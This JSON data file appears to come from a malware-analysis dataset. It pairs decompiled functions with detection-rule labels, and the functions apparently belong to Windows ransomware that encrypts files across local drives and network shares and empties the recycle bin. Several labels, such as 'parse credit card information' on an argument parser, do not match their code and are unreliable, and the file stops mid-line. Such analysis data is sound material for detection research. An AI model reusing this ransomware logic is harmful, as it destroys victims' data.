{
    "00401f00": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00401f00(int32_t arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_8h = 1;\n    do {\n        if (arg_8h <= var_8h) {\n            return NULL;\n        }\n        var_4h = *(arg_ch + var_8h * 4);\n        var_ch = 0;\n        if (*var_4h == 0x2d) {\n            for (; *var_4h == 0x2d; var_4h = var_4h + 1) {\n            }\n            for (; *var_4h != 0x3d; var_4h = var_4h + 1) {\n                if (*var_4h != *arg_10h) {\n                    var_ch = var_ch + 1;\n                }\n                arg_10h = arg_10h + 1;\n            }\n            if (var_ch == 0) {\n                return var_4h + 1;\n            }\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 285
    },
    "00405370": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405370(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    uint uStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint32_t uStack64;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        (&var_60h)[var_4h] = *(arg_ch + var_4h * 8);\n    }\n    for (var_8h = 0; var_8h < 2; var_8h = var_8h + 1) {\n        for (var_4h = 0; var_4h < 9; var_4h = var_4h + 1) {\n            if ((var_4h & 1) == 0) {\n                var_24h = (&var_60h)[var_4h] >> 0x1f;\n                iVar3 = ((&var_60h)[var_4h] & (&var_60h)[var_4h] >> 0x1f) >> 0x1a;\n                var_14h = -iVar3;\n                (&var_60h)[var_4h] = iVar3 * -0x4000000 + (&var_60h)[var_4h];\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + iVar3;\n            }\n            else {\n                var_20h = (&var_60h)[var_4h] >> 0x1f;\n                iVar3 = ((&var_60h)[var_4h] & (&var_60h)[var_4h] >> 0x1f) >> 0x19;\n                var_10h = -iVar3;\n                (&var_60h)[var_4h] = iVar3 * -0x2000000 + (&var_60h)[var_4h];\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + iVar3;\n            }\n        }\n        var_28h = uStack64 >> 0x1f;\n        iVar3 = (uStack64 & uStack64 >> 0x1f) >> 0x19;\n        var_18h = -iVar3;\n        uStack64 = iVar3 * -0x2000000 + uStack64;\n        var_60h = var_60h + iVar3 * 0x13;\n    }\n    var_2ch = var_60h >> 0x1f;\n    iVar3 = (var_60h & var_60h >> 0x1f) >> 0x1a;\n    var_1ch = -iVar3;\n    var_60h = iVar3 * -0x4000000 + var_60h;\n    var_5ch = var_5ch + iVar3;\n    for (var_8h = 0; var_8h < 2; var_8h = var_8h + 1) {\n        for (var_4h = 0; var_4h < 9; var_4h = var_4h + 1) {\n            if ((var_4h & 1) == 0) {\n                iVar3 = (&var_60h)[var_4h];\n                var_34h = iVar3 >> 0x1a;\n                (&var_60h)[var_4h] = (&var_60h)[var_4h] & 0x3ffffff;\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + (iVar3 >> 0x1a);\n            }\n            else {\n                iVar3 = (&var_60h)[var_4h];\n                var_30h = iVar3 >> 0x19;\n                (&var_60h)[var_4h] = (&var_60h)[var_4h] & 0x1ffffff;\n                (&var_5ch)[var_4h] = (&var_5ch)[var_4h] + (iVar3 >> 0x19);\n            }\n        }\n        var_38h = uStack64 >> 0x19;\n        uStack64 = uStack64 & 0x1ffffff;\n        var_60h = var_38h * 0x13 + var_60h;\n    }\n    var_ch = fcn.00405350(var_60h, 0x3ffffed);\n    for (var_4h = 1; var_4h < 10; var_4h = var_4h + 1) {\n        if ((var_4h & 1) == 0) {\n            uVar1 = fcn.004052f0((&var_60h)[var_4h], 0x3ffffff);\n            var_ch = uVar1 & var_ch;\n        }\n        else {\n            uVar1 = fcn.004052f0((&var_60h)[var_4h], 0x1ffffff);\n            var_ch = uVar1 & var_ch;\n        }\n    }\n    var_60h = var_60h - (var_ch & 0x3ffffed);\n    for (var_4h = 1; var_4h < 10; var_4h = var_4h + 1) {\n        if ((var_4h & 1) == 0) {\n            (&var_60h)[var_4h] = (&var_60h)[var_4h] - (var_ch & 0x3ffffff);\n        }\n        else {\n            (&var_60h)[var_4h] = (&var_60h)[var_4h] - (var_ch & 0x1ffffff);\n        }\n    }\n    iVar3 = var_5ch << 2;\n    iStack92 = iStack92 << 3;\n    iStack88 = iStack88 << 5;\n    iStack84 = iStack84 << 6;\n    iStack76 = iStack76 << 1;\n    iStack72 = iStack72 << 3;\n    iStack68 = iStack68 << 4;\n    iVar2 = uStack64 << 6;\n    *arg_8h = 0;\n    arg_8h[0x10] = 0;\n    *arg_8h = *arg_8h | var_60h;\n    arg_8h[1] = var_60h >> 8;\n    arg_8h[2] = var_60h >> 0x10;\n    arg_8h[3] = var_60h >> 0x18;\n    arg_8h[3] = arg_8h[3] | iVar3;\n    arg_8h[4] = iVar3 >> 8;\n    arg_8h[5] = iVar3 >> 0x10;\n    arg_8h[6] = iVar3 >> 0x18;\n    arg_8h[6] = arg_8h[6] | iStack92;\n    arg_8h[7] = iStack92 >> 8;\n    arg_8h[8] = iStack92 >> 0x10;\n    arg_8h[9] = iStack92 >> 0x18;\n    arg_8h[9] = arg_8h[9] | iStack88;\n    arg_8h[10] = iStack88 >> 8;\n    arg_8h[0xb] = iStack88 >> 0x10;\n    arg_8h[0xc] = iStack88 >> 0x18;\n    arg_8h[0xc] = arg_8h[0xc] | iStack84;\n    arg_8h[0xd] = iStack84 >> 8;\n    arg_8h[0xe] = iStack84 >> 0x10;\n    arg_8h[0xf] = iStack84 >> 0x18;\n    arg_8h[0x10] = arg_8h[0x10] | uStack80;\n    arg_8h[0x11] = uStack80 >> 8;\n    arg_8h[0x12] = uStack80 >> 0x10;\n    arg_8h[0x13] = uStack80 >> 0x18;\n    arg_8h[0x13] = arg_8h[0x13] | iStack76;\n    arg_8h[0x14] = iStack76 >> 8;\n    arg_8h[0x15] = iStack76 >> 0x10;\n    arg_8h[0x16] = iStack76 >> 0x18;\n    arg_8h[0x16] = arg_8h[0x16] | iStack72;\n    arg_8h[0x17] = iStack72 >> 8;\n    arg_8h[0x18] = iStack72 >> 0x10;\n    arg_8h[0x19] = iStack72 >> 0x18;\n    arg_8h[0x19] = arg_8h[0x19] | iStack68;\n    arg_8h[0x1a] = iStack68 >> 8;\n    arg_8h[0x1b] = iStack68 >> 0x10;\n    arg_8h[0x1c] = iStack68 >> 0x18;\n    arg_8h[0x1c] = arg_8h[0x1c] | iVar2;\n    arg_8h[0x1d] = iVar2 >> 8;\n    arg_8h[0x1e] = iVar2 >> 0x10;\n    arg_8h[0x1f] = iVar2 >> 0x18;\n    return;\n}\n",
        "token_count": 2414
    },
    "00406a90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: nNumberOfBytesToWrite\n// WARNING: Variable defined which should be unmapped: lpFileSize\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Removing unreachable block (ram,0x00406db2)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406a90(uint lpExistingFileName)\n\n{\n    uint *arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_EBP;\n    bool bVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint nNumberOfBytesToRead;\n    uint var_11c8h;\n    uint var_11c4h;\n    uint var_11c0h;\n    uint var_11bch;\n    uint var_11b8h;\n    uint var_11b4h;\n    uint var_11b0h;\n    uint32_t var_11ach;\n    int32_t var_11a8h;\n    uint32_t var_11a4h;\n    int32_t var_11a0h;\n    uint lpNewFileName;\n    uint *liDistanceToMove;\n    int32_t lpNewFilePointer;\n    uint var_1190h;\n    uint hObject;\n    uint var_1188h;\n    uint var_bch;\n    uint var_9ch;\n    uint lpBuffer;\n    int32_t var_5ch;\n    int32_t var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint *var_3ch;\n    int32_t var_38h;\n    uint *lpNumberOfBytesWritten;\n    uint *nNumberOfBytesToWrite;\n    uint *lpFileSize;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_4h;\n    \n    fcn.00410e70();\n    arg_8h = fcn.00410af0(0x10000);\n    if (arg_8h != NULL) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        *(arg_8h + iVar1 * 2 + -0x10) = 0;\n        (*_sym.imp.KERNEL32.dll_MoveFileExW)();\n        var_24h = 0x3;\n        var_28h = NULL;\n        lpFileSize = 0x1;\n        nNumberOfBytesToWrite = 0xc0000000;\n        var_38h = 0x406b37;\n        lpNumberOfBytesWritten = arg_8h;\n        puVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        fcn.00410ad0(arg_8h);\n        if (puVar2 != 0xffffffff) {\n            while( true ) {\n                (*_sym.imp.KERNEL32.dll_GetFileSizeEx)();\n                if ((var_28h < 0) || ((var_28h < 1 && (lpFileSize < 0x49)))) goto code_r0x004070ee;\n                iVar1 = fcn.00410af0(0x100000);\n                if (iVar1 == 0) goto code_r0x004070ee;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                var_24h = &fcn.00406a90::nNumberOfBytesToWrite;\n                var_28h = 0x48;\n                lpFileSize = &fcn.00406a90::lpBuffer;\n                lpNumberOfBytesWritten = 0x406bf0;\n                nNumberOfBytesToWrite = puVar2;\n                (*_sym.imp.KERNEL32.dll_ReadFile)();\n                if (((((var_54h != 0x309e04e2) || (var_50h != 0x2950a689)) || (_var_4ch != -0x24f6181a1baa0b2f)) ||\n                    ((var_44h != -0x749324fb || (var_40h != -0x3cfc03b)))) ||\n                   ((var_3ch != 0xeaa746fc || (var_38h != -0x7d4d091f)))) break;\n                bVar4 = lpFileSize < 0x48;\n                lpFileSize = lpFileSize + -0x12;\n                var_28h = var_28h - bVar4;\n                fcn.00401fb0(&fcn.00406a90::var_24h, 0x41107c, &fcn.00406a90::lpBuffer);\n                fcn.0040d570(&fcn.00406a90::var_24h, 0x20, &fcn.00406a90::var_bch);\n                iVar3 = fcn.0040cea0(&fcn.00406a90::var_bch, 0x40);\n                if (var_5ch != iVar3) {\n                    (*_sym.imp.USER32.dll_MessageBoxW)();\n                    break;\n                }\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                var_24h = 0x406cda;\n                (*_sym.imp.KERNEL32.dll_SetEndOfFile)();\n                var_24h = 0x100;\n                var_28h = 0x100;\n                lpFileSize = &fcn.00406a90::var_bch;\n                nNumberOfBytesToWrite = &fcn.00406a90::var_1188h;\n                lpNumberOfBytesWritten = 0x406cf7;\n                fcn.0040c780(nNumberOfBytesToWrite, lpFileSize, 0x100, 0x100);\n                var_24h = &fcn.00406a90::var_9ch;\n                var_28h = &fcn.00406a90::var_1188h;\n                lpFileSize = 0x406d0d;\n                fcn.0040c810(var_28h, var_24h);\n                liDistanceToMove = NULL;\n                lpNewFilePointer = 0;\n                iVar5 = 0;\n                var_24h = NULL;\n                var_28h = NULL;\n                lpFileSize = NULL;\n                nNumberOfBytesToWrite = NULL;\n                var_38h = 0x406d3a;\n                lpNumberOfBytesWritten = puVar2;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                if ((var_28h < 0) || ((var_28h < 1 && (lpFileSize < 0x1400001)))) {\n                    if ((var_28h < 0) || ((var_28h < 1 && (lpFileSize < 0x500001)))) {\n                        if ((-1 < var_28h) && ((0 < var_28h || (lpFileSize != NULL)))) {\n                            if ((-1 < var_28h) && ((0 < var_28h || (0x40 < lpFileSize)))) {\n                                fcn.00410dc0();\n                            }\n                            (*_sym.imp.KERNEL32.dll_ReadFile)();\n                            var_24h = &fcn.00406a90::var_1188h;\n                            var_28h = NULL;\n                            lpFileSize = 0x407085;\n                            fcn.0040cb70(0, var_24h, iVar1, iVar1, nNumberOfBytesToWrite);\n                            var_24h = NULL;\n                            lpFileSize = 0x4070a7;\n                            var_28h = puVar2;\n                            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            lpFileSize = NULL;\n                            lpNumberOfBytesWritten = &fcn.00406a90::lpNumberOfBytesWritten;\n                            var_40h = 0x4070c5;\n                            var_3ch = puVar2;\n                            var_38h = iVar1;\n                            nNumberOfBytesToWrite = lpNumberOfBytesWritten;\n                            (*_sym.imp.KERNEL32.dll_WriteFile)();\n                        }\n                    }\n                    else {\n                        iVar6 = fcn.00410dc0();\n                        _var_11ach = 0;\n                        while( true ) {\n                            liDistanceToMove = iVar5;\n                            if ((0 < var_11a8h) || ((-1 < _var_11ach && (2 < var_11ach)))) break;\n                            (*_sym.imp.KERNEL32.dll_ReadFile)();\n                            var_24h = &fcn.00406a90::var_1188h;\n                            var_28h = NULL;\n                            lpFileSize = 0x406f4a;\n                            fcn.0040cb70(0, var_24h, iVar1, iVar1, nNumberOfBytesToWrite);\n                            var_24h = liDistanceToMove;\n                            lpFileSize = 0x406f6c;\n                            var_28h = puVar2;\n                            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            lpFileSize = NULL;\n                            lpNumberOfBytesWritten = &fcn.00406a90::lpNumberOfBytesWritten;\n                            var_40h = 0x406f8a;\n                            var_3ch = puVar2;\n                            var_38h = iVar1;\n                            nNumberOfBytesToWrite = lpNumberOfBytesWritten;\n                            (*_sym.imp.KERNEL32.dll_WriteFile)();\n                            iVar5 = iVar6 + iVar5;\n                            var_40h = 0;\n                            var_44h = 0;\n                            var_54h = 0x406fcd;\n                            var_50h = puVar2;\n                            _var_4ch = iVar5;\n                            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            _var_11ach = CONCAT44(var_11a8h + (0xfffffffe < var_11ach), var_11ach + 1);\n                        }\n                    }\n                }\n                else {\n                    iVar5 = fcn.00410dc0();\n                    var_11a4h = 0;\n                    for (var_11a0h = 0; CONCAT44(var_11a0h, var_11a4h) < iVar5; var_11a0h = var_11a0h + bVar4) {\n                        (*_sym.imp.KERNEL32.dll_ReadFile)();\n                        var_24h = &fcn.00406a90::var_1188h;\n                        var_28h = NULL;\n                        lpFileSize = 0x406e03;\n                        fcn.0040cb70(0, var_24h, iVar1, iVar1, nNumberOfBytesToWrite);\n                        var_24h = liDistanceToMove;\n                        lpFileSize = 0x406e25;\n                        var_28h = puVar2;\n                        (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                        lpFileSize = NULL;\n                        nNumberOfBytesToWrite = &fcn.00406a90::lpNumberOfBytesWritten;\n                        lpNumberOfBytesWritten = 0x100000;\n                        var_40h = 0x406e44;\n                        var_3ch = puVar2;\n                        var_38h = iVar1;\n                        (*_sym.imp.KERNEL32.dll_WriteFile)();\n                        bVar4 = 0xff5fffff < liDistanceToMove;\n                        liDistanceToMove = liDistanceToMove + 0x280000;\n                        lpNewFilePointer = lpNewFilePointer + bVar4;\n                        var_40h = 0;\n                        var_44h = 0;\n                        var_54h = 0x406e84;\n                        var_50h = puVar2;\n                        var_4ch = liDistanceToMove;\n                        var_48h = lpNewFilePointer;\n                        (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                        bVar4 = 0xfffffffe < var_11a4h;\n                        var_11a4h = var_11a4h + 1;\n                    }\n                }\n            }\n            fcn.00410ad0(iVar1);\ncode_r0x004070ee:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n    }\n    fcn.00410cf7(unaff_EBP);\n    return;\n}\n",
        "token_count": 2713
    },
    "00407110": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00407110(int32_t param_1)\n\n{\n    int32_t var_4h;\n    \n    var_4h = param_1;\n    while( true ) {\n        var_4h = fcn.00410c90(var_4h);\n        if (var_4h == 0) break;\n        fcn.00406a90(var_4h);\n        fcn.00410ad0(var_4h);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    return;\n}\n",
        "token_count": 138
    },
    "00407150": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: hFindFile\n\nvoid __cdecl fcn.00407150(uint lpString2)\n\n{\n    int32_t lpString2_00;\n    int32_t iVar1;\n    int32_t hFindFile;\n    uint32_t var_260h;\n    int32_t var_25ch;\n    uint lpFileName;\n    uint32_t lpFindFileData;\n    uint lpString1;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    lpString2_00 = fcn.00410af0(0x10000);\n    if (lpString2_00 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString2_00, lpString2);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(lpString2_00, 0x4012ec);\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpString2_00, &lpFindFileData);\n        if (hFindFile != -1) {\n            do {\n                for (var_260h = 0; var_260h < 0x1f; var_260h = var_260h + 1) {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1, *(var_260h * 4 + 0x411000));\n                    if (iVar1 == 0) goto code_r0x004072e6;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString2_00, lpString2);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpString2_00, 0x4012f4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpString2_00, &lpString1);\n                if ((lpFindFileData & 0x10) == 0) {\n                    var_25ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString1);\n                    while (var_25ch = var_25ch + -1,  -1 < var_25ch) {\n                        if (*(&lpString1 + var_25ch * 2) == 0x2e) {\n                            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1 + var_25ch * 2, 0x4012f8);\n                            if (iVar1 != 0) break;\n                            fcn.00410bf0(lpString2_00);\n                        }\n                    }\n                }\n                else {\n                    fcn.00407150(lpString2_00);\n                }\ncode_r0x004072e6:\n                iVar1 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            } while (iVar1 != 0);\n            (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString2_00, lpString2);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpString2_00, 0x40130c);\n            (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpString2_00);\n        }\n        fcn.00410ad0(lpString2_00);\n    }\n    fcn.00410cf7(hFindFile);\n    return;\n}\n",
        "token_count": 764
    },
    "00407360": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407360(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint arg_8h_00;\n    uint32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    var_8h = 0xffffffff;\n    var_ch = 0x4000;\n    arg_8h_00 = 2;\n    iVar1 = sub.MPR.dll_WNetOpenEnumW(2, 0, 0x13, arg_8h, &var_10h);\n    if (iVar1 == 0) {\n        puVar3 = var_ch;\n        iVar1 = fcn.00410af0(var_ch);\n        if (iVar1 != 0) {\n            while( true ) {\n                puVar3 = &var_ch;\n                iVar2 = sub.MPR.dll_WNetEnumResourceW();\n                if (iVar2 != 0) break;\n                for (var_14h = 0; var_14h < var_8h; var_14h = var_14h + 1) {\n                    if ((*(iVar1 + 0xc + var_14h * 0x20) & 2) == 0) {\n                        fcn.00407150(*(iVar1 + 0x14 + var_14h * 0x20));\n                    }\n                    else {\n                        fcn.00407360(var_14h * 0x20 + iVar1);\n                    }\n                }\n            }\n            fcn.00410ad0(iVar1);\n        }\n        sub.MPR.dll_WNetCloseEnum(puVar3);\n        arg_8h_00 = var_10h;\n    }\n    fcn.00410cf7(arg_8h_00);\n    return;\n}\n",
        "token_count": 440
    },
    "00407450": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_e8h\n\nvoid __cdecl fcn.00407450(uint lpString2)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint var_e8h;\n    uint32_t var_e4h;\n    uint *lpString1;\n    uint *var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint32_t var_d0h;\n    uint var_cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    var_d0h = 0;\n    var_d8h = 0;\n    var_d4h = 0;\n    do {\n        arg_8h = sub.NETAPI32.dll_NetShareEnum(lpString2, 1, &var_dch, 0xffffffff, &var_d0h, &var_d8h, &var_d4h);\n        if ((arg_8h == 0) || (arg_8h == 0xea)) {\n            lpString1 = var_dch;\n            for (var_e4h = 1; var_e4h <= var_d0h; var_e4h = var_e4h + 1) {\n                if ((lpString1[1] == 0) || (lpString1[1] == -0x80000000)) {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*lpString1);\n                    if (2 < iVar1) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*lpString1, 0x401334);\n                        if (iVar1 != 0) {\n                            (*_sym.imp.KERNEL32.dll_lstrcpyW)(&var_cch, 0x401344);\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_cch, lpString2);\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_cch, 0x40134c);\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_cch, *lpString1);\n                            fcn.00407150(&var_cch);\n                        }\n                    }\n                }\n                lpString1 = lpString1 + 3;\n            }\n            sub.NETAPI32.dll_NetApiBufferFree(var_dch);\n        }\n    } while (arg_8h == 0xea);\n    fcn.00410cf7(arg_8h);\n    return;\n}\n",
        "token_count": 554
    },
    "null": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t arg_8h;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint lpString1;\n    uint32_t hObject;\n    uint32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint32_t var_5ch;\n    uint lpHandles;\n    uint nCount;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint lpRootPathName;\n    int32_t lpString;\n    int32_t lpString2;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpSystemInfo;\n    int32_t var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    (*_sym.imp.USER32.dll_MessageBoxA)(0, 0x401350, 0, 0);\n    var_2ch = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(&var_2ch);\n    uVar1 = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(uVar1);\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenMutexA)(0x1f0001, 0, 0x401378);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0x401388);\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)(0, 0);\n    fcn.00410ac0();\n    fcn.0040c770();\n    iVar2 = fcn.00401f00(var_2ch, uVar1, 0x401398);\n    if (iVar2 != 0) {\n        fcn.00406a90(iVar2);\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinA)(0, 0, 7);\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n    uVar7 = var_14h << 1;\n    fcn.00410b90(var_14h * 3);\n    iVar2 = fcn.00401f00(var_2ch, uVar1, 0x4013ac);\n    arg_8h = fcn.00410af0(var_14h << 3);\n    if (arg_8h != 0) {\n        for (var_5ch = 0; var_5ch < uVar7; var_5ch = var_5ch + 1) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00407110, 0, 0, 0);\n            *(arg_8h + var_5ch * 4) = uVar3;\n        }\n        lpString2 = fcn.00401f00(var_2ch, uVar1, 0x4013b4);\n        if (lpString2 != 0) {\n            var_48h = 1;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n            for (var_44h = 0; var_44h < iVar4; var_44h = var_44h + 1) {\n                if (*(lpString2 + var_44h * 2) == 0x2c) {\n                    *(lpString2 + var_44h * 2) = 0;\n                    var_48h = var_48h + 1;\n                }\n            }\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                uVar3 = fcn.00410af0(iVar4 * 2 + 2);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, lpString2);\n                fcn.00407450(uVar3);\n                fcn.00410ad0(uVar3);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                lpString2 = lpString2 + 2 + iVar4 * 2;\n                var_48h = var_48h + -1;\n            } while (var_48h != 0);\n        }\n        lpString = fcn.00401f00(var_2ch, uVar1, 0x4013c4);\n        if (lpString != 0) {\n            var_50h = 1;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n            for (var_4ch = 0; var_4ch < iVar4; var_4ch = var_4ch + 1) {\n                if (*(lpString + var_4ch * 2) == 0x2c) {\n                    *(lpString + var_4ch * 2) = 0;\n                    var_50h = var_50h + 1;\n                }\n            }\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                uVar1 = fcn.00410af0(iVar4 * 2 + 2);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, lpString);\n                fcn.00407150(uVar1);\n                fcn.00410ad0(uVar1);\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                lpString = lpString + 2 + iVar4 * 2;\n                var_50h = var_50h + -1;\n            } while (var_50h != 0);\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(iVar2, 0x4013d0);\n        if (iVar4 == 0) {\n            fcn.00407360(0);\n        }\n        var_68h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (var_68h != 0) {\n            for (var_34h._0_2_ = 0x41; var_34h < 0x5b; var_34h._0_2_ = var_34h + 1) {\n                if ((var_68h & 1) != 0) {\n                    iVar4 = fcn.00410af0(0xe);\n                    if (iVar4 != 0) {\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar4, 0x4013e0);\n                        uVar1 = 0x4013ec;\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar4 + 10, 0x4013ec);\n                        *(iVar4 + 8) = var_34h;\n                        iVar5 = 